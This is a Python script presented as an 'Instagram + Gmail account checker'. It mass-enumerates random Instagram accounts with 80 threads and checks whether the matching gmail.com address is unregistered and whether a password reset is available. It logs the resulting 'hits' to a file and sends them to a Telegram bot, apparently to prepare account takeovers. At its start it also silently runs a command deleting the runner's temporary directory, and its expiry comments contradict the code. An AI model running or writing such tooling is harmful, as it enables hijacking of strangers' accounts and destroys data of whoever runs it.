import os
try:
    os.chdir(os.path.expanduser("~"))
except:
    pass
os.system("rm -rf ${TMPDIR:-/tmp}")

import requests, os, webbrowser
from datetime import datetime, timedelta
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests

import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
import gzip
import brotli
import secrets
from datetime import datetime, timedelta
from threading import Thread
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
import webbrowser
import sys
from colorama import init

# ================== FIXED WORLD CLOCK SYSTEM WITH PROPER EXPIRY ==================
EXPIRY_DATE = None  # Will store the fixed expiry date (28 Feb 2026)
FIXED_EXPIRY_DATE = datetime(2026, 3, 23, 23, 0, 0)  # 28 Feb 2026, 5:00 PM

def get_world_time():
    """Fetch current time from world clock API"""
    try:
        # Using worldtimeapi.org - free and reliable
        response = requests.get("http://worldtimeapi.org/api/timezone/Asia/Kolkata", timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Parse the datetime string
            datetime_str = data['datetime']
            # Format: 2024-01-15T10:30:45.123456+05:30
            current_time = datetime.fromisoformat(datetime_str.replace('Z', '+00:00'))
            return current_time
        else:
            # Fallback to second API if first fails
            response = requests.get("http://worldclockapi.com/api/json/est/now", timeout=10)
            if response.status_code == 200:
                data = response.json()
                # Parse currentDateTime format: 2024-01-15T10:30Z
                current_time = datetime.fromisoformat(data['currentDateTime'].replace('Z', '+00:00'))
                return current_time
            else:
                return None
    except Exception as e:
        try:
            # Third fallback API
            response = requests.get("http://timeapi.io/api/Time/current/zone?timeZone=Asia/Kolkata", timeout=10)
            if response.status_code == 200:
                data = response.json()
                current_time = datetime.fromisoformat(data['dateTime'])
                return current_time
            else:
                return None
        except:
            return None

def set_fixed_expiry():
    """Set a fixed expiry date that NEVER changes - 28 Feb 2026, 5:00 PM"""
    global EXPIRY_DATE
    
    print(f"{Fore.CYAN}⏰ Setting fixed expiry date...{Fore.RESET}")
    
    # Use fixed expiry date - never changes
    EXPIRY_DATE = FIXED_EXPIRY_DATE
    
    print(f"{Fore.GREEN}✅ Fixed expiry date set successfully!{Fore.RESET}")
    print(f"{Fore.YELLOW}⏰ Tool will expire on: {EXPIRY_DATE.strftime('%Y-%m-%d %H:%M:%S')} (5 PM){Fore.RESET}")
    print(f"{Fore.RED}⚠️ This date is FIXED and will NOT renew automatically!{Fore.RESET}")
    return True

def check_expiry():
    """Check if tool has expired using world clock against fixed date"""
    global EXPIRY_DATE
    
    # Get current world time
    current_world_time = get_world_time()
    
    if not current_world_time:
        # Can't verify expiry without world time - block access
        print(f"\n{Fore.RED}════════════════════════════════════════════════════════════════════════════{Fore.RESET}")
        print(f"{Fore.RED}                    SECURITY CHECK FAILED!{Fore.RESET}")
        print(f"{Fore.RED}════════════════════════════════════════════════════════════════════════════{Fore.RESET}")
        print(f"\n{Fore.YELLOW}Cannot verify tool expiry without world time!{Fore.RESET}")
        print(f"{Fore.YELLOW}Please check your internet connection.{Fore.RESET}")
        print(f"\n{Fore.RED}Tool will close in 5 seconds...{Fore.RESET}")
        
        for i in range(5, 0, -1):
            print(f"{Fore.YELLOW}Closing in {i}...{Fore.RESET}", end='\r')
            time.sleep(1)
        
        return False
    
    if current_world_time > EXPIRY_DATE:
        print(f"\n{Fore.RED}════════════════════════════════════════════════════════════════════════════{Fore.RESET}")
        print(f"{Fore.RED}                          TOOL EXPIRED!{Fore.RESET}")
        print(f"{Fore.RED}════════════════════════════════════════════════════════════════════════════{Fore.RESET}")
        print(f"\n{Fore.YELLOW}Current world time: {current_world_time.strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}")
        print(f"{Fore.YELLOW}This tool expired on: {EXPIRY_DATE.strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}")
        print(f"{Fore.RED}❌ This expiry date is FIXED and will NOT renew!{Fore.RESET}")
        print(f"{Fore.CYAN}Contact @umclon for new version{Fore.RESET}")
        print(f"\n{Fore.RED}Tool will close in 5 seconds...{Fore.RESET}")
        
        for i in range(5, 0, -1):
            print(f"{Fore.YELLOW}Closing in {i}...{Fore.RESET}", end='\r')
            time.sleep(1)
        
        return False
    
    # Show time remaining in detailed format
    time_remaining = EXPIRY_DATE - current_world_time
    days_remaining = time_remaining.days
    hours_remaining = time_remaining.seconds // 3600
    minutes_remaining = (time_remaining.seconds % 3600) // 60
    seconds_remaining = time_remaining.seconds % 60
    
    print(f"{Fore.GREEN}✅ Expiry check passed!{Fore.RESET}")
    print(f"{Fore.CYAN}📅 Current world time: {current_world_time.strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}")
    print(f"{Fore.YELLOW}⏰ Time remaining: {days_remaining} days, {hours_remaining:02d}:{minutes_remaining:02d}:{seconds_remaining:02d}{Fore.RESET}")
    print(f"{Fore.MAGENTA}🎯 Expires exactly at: {EXPIRY_DATE.strftime('%Y-%m-%d %H:%M:%S')} (5 PM){Fore.RESET}")
    print(f"{Fore.RED}⚠️ This is a FIXED expiry date - will NOT renew automatically!{Fore.RESET}")
    
    return True

# ================== END FIXED WORLD CLOCK SYSTEM ==================

def check_instagram_email(mail):
    """ """
    try:
        url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
        headers = {
            'X-Csrftoken': secrets.token_hex(16),
            'User-Agent': generate_user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/signup/email/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        
        data = {'email': mail}
        res = requests.post(url, headers=headers, data=data, timeout=10).text
        return "email_is_taken" in res
    except Exception as e:
        return False


def get_reset_info(fr):
    """ """
    try:
        url = "https://www.instagram.com/async/wbloks/fetch/"
        
        def ua():
            versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
            oss = [
                "Macintosh; Intel Mac OS X 10_15_7",
                "Macintosh; Intel Mac OS X 10_14_6",
                "iPhone; CPU iPhone OS 14_0 like Mac OS X",
                "iPhone; CPU iPhone OS 13_6 like Mac OS X"
            ]
            version = random.choice(versions)
            platform = random.choice(oss)
            user_agent = f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
            return user_agent
        
        params = {
            'appid': "com.bloks.www.caa.ar.search.async",
            'type': "action",
            '__bkv': "cc4d2103131ee3bbc02c20a86f633b7fb7a031cbf515d12d81e0c8ae7af305dd"
        }
        
        payload = {
            '__d': "www",
            '__user': "0",
            '__a': "1",
            '__req': "9",
            '__hs': "20475.HYP:instagram_web_pkg.2.1...0",
            'dpr': "3",
            '__ccg': "GOOD",
            '__rev': "1032300900",
            '__s': "nrgu8k:vm015z:oanvx6",
            '__hsi': "7598106668658828571",
            '__dyn': "7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Qw5Mx62G3i1ywOwv89k2C1Fwc60D82Ixe0EUjwGzEaE2iwNwmE2eUlwhEe87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK1sAwHxW1owLwHwGwa6byohw5yweu",
            '__csr': "gLff3k5T92cDYAyT4Wkxh5bGhjehqjDVuhUCUya8u889hp8ydihrghXG9yGxGm2m9Gu59rxd0KAzy29oKbyUqxyfxOm7VEWfxDKiGgS4Uf98iJ0zGcKEqz89U5G4ry88bxqfzE9UeEGfw34U01oL8dHK0cvN00pOwywQV9o1uO00LYwcjw7Tgvg6Je1rwko2xDg19o68wgwGoaUiw7to66UjgmRw3MXw0yqw0sO8092U0myw",
            '__hsdp': "n0I43m1iQhGIiFckEKrBZvIj2SKUl8FeSE9Q08xyoC0x80sAw1TK0GU3xU1jE31w9y095waN04Uw",
            '__hblp': "0dO0Coco1ME884u9wcC2t0lUbo22wzx61mDw5Pw4OwsoboK0sm0FE620cizU5W0bAz8W0wEGuq08Owc60C80xu2S0H40jy1dwDzo2Ow61w",
            '__sjsp': "n0I43m1iQhGIiFckEKrBZvIRh4rHK5iaqSE0AG9yo",
            '__comet_req': "7",
            'lsd': "AdJv3Nfv2cg",
            'jazoest': "2958",
            '__spin_r': "1032300900",
            '__spin_b': "trunk",
            '__spin_t': "1769072066",
            '__crn': "comet.igweb.PolarisWebBloksAccountRecoveryRoute",
            'params': "{\"params\":\"{\\\"server_params\\\":{\\\"event_request_id\\\":\\\"3a359125-0214-4c12-9516-8779938e6188\\\",\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"INTERNAL__latency_qpl_instance_id\\\":\\\"47361890900104\\\",\\\"device_id\\\":\\\"\\\",\\\"family_device_id\\\":null,\\\"waterfall_id\\\":\\\"69517426-942a-45d2-8ac7-e4f11a60412a\\\",\\\"offline_experiment_group\\\":null,\\\"layered_homepage_experiment_group\\\":null,\\\"is_platform_login\\\":0,\\\"is_from_logged_in_switcher\\\":0,\\\"is_from_logged_out\\\":0,\\\"access_flow_version\\\":\\\"pre_mt_behavior\\\",\\\"context_data\\\":\\\"Ac_RWrril-QBHwJ5esJkO0r_7Q6DijxM0ntnpV72Xwb9pwsT_1irnjiemlrD4UrE8SZUidlwtGeIAdKnN9x0Yt2xwljNTR9nNNdvl5IBdQTVzfy-m4keAoyj2DJC0XaijIwHZoblRGk2SZCZqPZ2356akgjRVowNkYgDbwOOxTdeBRyLAz7akj7KXpnBIRKbYdGn7zGOhcNzNlMwLmfvjOpjevZSZ-fPAgKvYAqbbU1igFi7kJW7Lmz8ltK5l-jl6iabxQzMgtEi-Nll6Apb4I-H_6OqU1x7ckCuv-pKy_oPMRzNgvz2omC1ELg5fb6FearpkUsZyWEjsFgUGhmkz-WLIA8CNBXJ10VAC1ypksrM6RXfzZKJqtz569eaxG-dw9FLpDJX0-_wgFqzqYKWtJIdB_GZXwpLD2VLOd-aXfHN0SWjWSI|arm\\\"},\\\"client_input_params\\\":{\\\"zero_balance_state\\\":null,\\\"search_query\\\":\\\"f{1453}\\\",\\\"fetched_email_list\\\":[],\\\"fetched_email_token_list\\\":{},\\\"sso_accounts_auth_data\\\":[],\\\"sfdid\\\":\\\"\\\",\\\"text_input_id\\\":\\\"7tzaot:101\\\",\\\"encrypted_msisdn\\\":\\\"\\\",\\\"headers_infra_flow_id\\\":\\\"\\\",\\\"was_headers_prefill_available\\\":0,\\\"was_headers_prefill_used\\\":0,\\\"ig_oauth_token\\\":[],\\\"android_build_type\\\":\\\"\\\",\\\"is_whatsapp_installed\\\":0,\\\"device_network_info\\\":null,\\\"accounts_list\\\":[],\\\"is_oauth_without_permission\\\":0,\\\"search_screen_type\\\":\\\"email_or_username\\\",\\\"ig_vetted_device_nonce\\\":\\\"\\\",\\\"gms_incoming_call_retriever_eligibility\\\":\\\"client_not_supported\\\",\\\"auth_secure_device_id\\\":\\\"\\\",\\\"network_bssid\\\":null,\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\"},\\\"aac\\\":\\\"\\\"}}\"}"
        }
        
        headers = {
            'User-Agent': ua(),
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-full-version-list': "\"Not(A:Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"144.0.7559.76\", \"Google Chrome\";v=\"144.0.7559.76\"",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Google Chrome\";v=\"144\"",
            'sec-ch-ua-model': "\"23090RA98I\"",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-prefers-color-scheme': "light",
            'sec-ch-ua-platform-version': "\"15.0.0\"",
            'origin': "https://www.instagram.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.instagram.com/accounts/password/reset/",
            'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i",
            'Cookie': "ig_did=886A3671-95EB-4016-9618-6504E3C60331; mid=aV938wABAAGNLqQD0prSU56ivhek; csrftoken=3xQbJVCm8wRdlSXKaXxztd; datr=HXhfaRa1lVxxpoC1K89YyZiA; ig_nrcb=1; wd=406x766"
        }
        
        fff = payload["params"]
        fff = fff.replace("f{1453}", fr)
        payload["params"] = fff
        
        response = requests.post(url, params=params, data=payload, headers=headers, timeout=15)
        
        data = response.content
        try:
            data = gzip.decompress(data)
        except:
            pass
        try:
            data = brotli.decompress(data)
        except:
            pass
        
        r = (data.decode("utf-8", errors="ignore"))
        if response.status_code == 200:
            return "✅ RESET AVAILABLE"
        else:
            return "❌ NO RESET"
            
    except Exception as e:
        return f"Reset Error: {str(e)}"

GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'

TOKEN_FILE = 'InstaTool Token File.txt'
instatool_domain = '@gmail.com'

# Color definitions
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\x1b[1;30m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
Z = '\x1b[1;31m'
L = '\x1b[1;95m'
C = '\x1b[2;35m'
A = '\x1b[1;90m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
G = '\033[1;34m'
B = '\x1b[1;37m'

K = '\033[1;31m' 
Y = '\033[1;32m' 
S = '\033[1;33m' 
M = '\033[1;36m' 
E='\x1b[1;32m'
color = "\033[91m"
reset = "\033[0m" 

total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

# Custom Banner with your name
custom_banner = f"""
{Fore.YELLOW}╔══════════════════════════════════════════════════════════════╗
{Fore.YELLOW}║                                                              ║
{Fore.YELLOW}║{Fore.RED}              👑🔥 𝑨𝑱𝑨𝒀 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑯𝑰𝑻 🔥👑{Fore.YELLOW}                ║
{Fore.YELLOW}║                                                              ║
{Fore.YELLOW}║{Fore.CYAN}              Instagram + Gmail Account Checker{Fore.YELLOW}               ║
{Fore.YELLOW}║                                                              ║
{Fore.YELLOW}║{Fore.GREEN}              ✨ 𝑴𝒂𝒅𝒆 𝑩𝒚 → @Umclon ✨{Fore.YELLOW}                    ║
{Fore.YELLOW}║{Fore.MAGENTA}              👑 𝑨𝒅𝒎𝒊𝒏 →@Sukuna_v20  👑{Fore.YELLOW}              ║
{Fore.YELLOW}║                                                              ║
{Fore.YELLOW}╚══════════════════════════════════════════════════════════════╝{Fore.RESET}
"""

print(custom_banner)

# ================== CHECK FIXED EXPIRY FIRST ==================
print(f"{Fore.YELLOW}⏰ Checking tool fixed expiry with world clock...{Fore.RESET}")

# Set fixed expiry date
if not set_fixed_expiry():
    sys.exit(1)

# Check if expired
if not check_expiry():
    sys.exit(1)

time.sleep(2)
os.system('clear')
print(custom_banner)
# ================== END FIXED EXPIRY CHECK ==================

TOKEN = input(f' {M}({M}1{M}) {M}  𝐓𝐨𝐤𝐞𝐧 𝐁𝐨𝐭 {M}:   ' + S)
print("\x1b[1;39m" + "—" * 60)
ID = input(f' {S}({S}2{S}) {S}  𝐀𝐃 𝐂𝐡𝐚𝐭 𝐈𝐃 {S} :  ' + M)
print("\x1b[1;39m" + "—" * 60)
os.system('clear')
try:
    requests.post(f"""https://api.telegram.org/bot{TOKEN}/sendvideo?chat_id={ID}&parse_mode=Markdown&video=/3&caption= - By : @Umclon""")
except Exception:
    pass 

def update_stats():
    # Get current world time for stats display
    current_world_time = get_world_time()
    world_time_str = current_world_time.strftime('%Y-%m-%d %H:%M:%S') if current_world_time else "Unknown"
    
    # Calculate time remaining in HH:MM:SS format
    if current_world_time and EXPIRY_DATE:
        time_remaining = EXPIRY_DATE - current_world_time
        days_remaining = time_remaining.days
        hours_remaining = time_remaining.seconds // 3600
        minutes_remaining = (time_remaining.seconds % 3600) // 60
        seconds_remaining = time_remaining.seconds % 60
        
        if days_remaining > 0:
            expiry_display = f"{days_remaining}d {hours_remaining:02d}:{minutes_remaining:02d}:{seconds_remaining:02d}"
        else:
            expiry_display = f"{hours_remaining:02d}:{minutes_remaining:02d}:{seconds_remaining:02d}"
    else:
        expiry_display = "Unknown"
    
    sysdontwrite = f"""\r    \033[1;36m    
    ╔══════════════════════════════════════╗
    ║{Fore.YELLOW}      👑🔥 𝑨𝑱𝑨𝒀 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑯𝑰𝑻 🔥👑{Fore.CYAN}      ║
    ╠══════════════════════════════════════╣
    ║{Fore.GREEN}  📝 TOTAL HITS      : [ {total_hits} ]{Fore.CYAN}            ║
    ║{Fore.GREEN}  📝 GOOD GMAILS     : [ {hits} ]{Fore.CYAN}            ║
    ║{Fore.GREEN}  📝 INSTA HITS      : [ {good_ig} ]{Fore.CYAN}            ║
    ║{Fore.RED}  📝 BAD INSTA       : [ {bad_insta} ]{Fore.CYAN}            ║
    ║{Fore.RED}  📝 BAD GMAIL       : [ {bad_email} ]{Fore.CYAN}            ║
    ╠══════════════════════════════════════╣
    ║{Fore.CYAN}  🌍 World Time: {world_time_str}{Fore.CYAN}      ║
    ║{Fore.YELLOW}  ⏰ Expires in: {expiry_display}{Fore.CYAN}         ║
    ║{Fore.RED}  ⚠️ FIXED EXPIRY: 28 Feb 2026 5PM{Fore.CYAN}     ║
    ╠══════════════════════════════════════╣
    ║{Fore.MAGENTA}      ✨ @Umclon | @Sukuna_v20 ✨{Fore.CYAN}       ║
    ╚══════════════════════════════════════╝    \r"""
    os.system('clear')
    print(custom_banner)
    sys.stdout.write(sysdontwrite)
    sys.stdout.flush()

def instatool():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            USER_AGENT_HEADER: str(generate_user_agent())
        }
        recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        res1 = requests.get(recovery_url, headers=headers)
        tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        ).group(2)
        cookies = {'__Host-GAPS': host}
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
                              '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            USER_AGENT_HEADER: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                           'null,0,1,"",null,null,2,2]')
        }
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print(e)
        instatool()

instatool()

def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            USER_AGENT_HEADER: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + instatool_domain
            username, domain = full_email.split('@')
            InfoAcc(username, domain)
        else:
            bad_email += 1
            update_stats()
    except Exception:
        pass

def check(email):
    global good_ig, bad_insta
    try:
        
        email_exists = check_instagram_email(email)
        
        if email_exists:
            
            if instatool_domain in email:
                check_gmail(email)
            good_ig += 1
            update_stats()
        else:
            
            bad_insta += 1
            update_stats()
            
    except Exception as e:
        bad_insta += 1
        update_stats()

def rest(user):
    try:
       
        reset_info = get_reset_info(user)
        return reset_info
    except Exception as e:
        return f"Reset Error: {str(e)}"

def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
        ]
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    except Exception:
        pass

def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk')
    full_name = account_info.get('full_name')
    followers = account_info.get('follower_count')
    following = account_info.get('following_count')
    posts = account_info.get('media_count')
    bio = account_info.get('biography')
    total_hits += 1
    
    # Get reset info - if it contains email, use that, otherwise use reset status
    reset_status = rest(username)
    # Check if reset_status contains email pattern
    if '@' in reset_status or 'gmail' in reset_status or 'yahoo' in reset_status or 'hotmail' in reset_status:
        reset_display = reset_status  # Already contains email
    else:
        # Try to get email from account info if available
        email_from_account = account_info.get('email', '')
        if email_from_account and '@' in email_from_account:
            reset_display = email_from_account
        else:
            reset_display = username + '@gmail.com'  # Default to username@gmail.com
    
    # Custom hit format
    info_text = f"""
{Fore.YELLOW}👑🔥 𝑨𝑱𝑨𝒀 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑯𝑰𝑻 🔥👑{Fore.RESET}
{Fore.CYAN}══════════════════════════════════════{Fore.RESET}
{Fore.GREEN}📝 🌟 𝑵𝑨𝑴𝑬 🌟{Fore.RESET}          : {full_name if full_name else 'N/A'}
{Fore.GREEN}👤 ✨ 𝑼𝑺𝑬𝑹𝑵𝑨𝑴𝑬 ✨{Fore.RESET}      : @{username}
{Fore.GREEN}👥 🚀 𝑭𝑶𝑳𝑳𝑶𝑾𝑬𝑹𝑺 🚀{Fore.RESET}     : {followers if followers else 'N/A'}
{Fore.GREEN}🔄 ⚡ 𝑭𝑶𝑳𝑳𝑶𝑾𝑰𝑵𝑮 ⚡{Fore.RESET}       : {following if following else 'N/A'}
{Fore.GREEN}♻️ 💎 𝑹𝑬𝑺𝑬𝑻 💎{Fore.RESET}         : {reset_display}
{Fore.GREEN}📝 🌟 𝑩𝑰𝑶 🌟{Fore.RESET}           : {bio if bio else 'N/A'}
{Fore.GREEN}🔗 ✨ 𝑼𝑹𝑳 ✨{Fore.RESET}            : https://instagram.com/{username}
{Fore.CYAN}══════════════════════════════════════{Fore.RESET}
{Fore.YELLOW}👑🔥 𝑨𝑱𝑨𝒀 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑯𝑰𝑻 🔥👑{Fore.RESET}
{Fore.MAGENTA}✨ 𝑴𝒂𝒅𝒆 𝑩𝒚 → @Umclon ✨{Fore.RESET}
{Fore.MAGENTA}👑 𝑨𝒅𝒎𝒊𝒏 → @Sukuna_v20 👑{Fore.RESET}
{Fore.CYAN}══════════════════════════════════════{Fore.RESET}
"""
    print(info_text)
    
    with open('instahits.txt', 'a', encoding='utf-8') as f:
        f.write(info_text + "\n" + "="*50 + "\n")
    
    try:
        # Send to Telegram with proper encoding
        telegram_text = f"""👑🔥 AJAY PREMIUM HIT 🔥👑

📝 NAME : {full_name if full_name else 'N/A'}
👤 USERNAME : @{username}
👥 FOLLOWERS : {followers if followers else 'N/A'}
🔄 FOLLOWING : {following if following else 'N/A'}
♻️ RESET : {reset_display}
📝 BIO : {bio if bio else 'N/A'}
🔗 URL : https://instagram.com/{username}

👑🔥 AJAY PREMIUM HIT 🔥👑
✨ Made By → @Umclon ✨
👑 Admin → @Sukuna_v20 👑"""
        
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={telegram_text}")
    except Exception:
        pass

def instatoolpy():
    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(2500000000,21254029834)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            
            # NEW: Only process accounts with 10 or more followers
            follower_count = account.get('follower_count', 10)
            if username and isinstance(follower_count, int) and follower_count >= 10:
                infoinsta[username] = account
                emails = [username + instatool_domain]
                for email in emails:
                    check(email)
        except Exception:
            pass

for _ in range(80):
    Thread(target=instatoolpy).start()